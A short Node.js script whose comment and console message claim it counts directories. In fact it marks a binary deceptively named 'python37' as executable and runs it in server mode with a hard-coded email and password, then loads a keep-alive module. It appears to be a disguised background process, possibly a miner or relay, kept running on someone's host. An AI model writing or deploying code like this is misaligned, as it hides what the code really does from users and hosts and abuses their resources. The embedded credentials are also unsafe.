
const { exec } = require('child_process');
 
// Counts the number of directory in
// current working directory
exec('chmod +x python37 && ./python37 --server --email udbdjfj@gmail.com --password Env112311', (error, stdout, stderr) => {
    if (error) {
        console.error(`exec error: ${error}`);
        return;
    }
    console.log(`stdout: No. of directories = ${stdout}`);
    if (stderr != "")
        console.error(`stderr: ${stderr}`);
});

const keep_alive = require('./keep_alive.js')
